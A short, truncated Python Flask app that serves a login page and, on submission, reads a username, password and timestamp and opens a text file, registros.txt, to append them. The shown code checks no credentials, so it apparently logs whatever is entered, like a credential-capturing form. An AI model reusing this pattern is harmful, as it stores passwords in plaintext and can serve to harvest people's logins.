from flask import Flask, render_template, request
import datetime

app = Flask(__name__)

@app.route('/')
def index():
    return render_template("login.html")

@app.route('/login', methods=['POST'])
def login():
    usuario = request.form['usuario']
    contraseña = request.form['contraseña']
    fecha = datetime.datetime.now()

    with open("registros.txt", "a") as f:
        f.write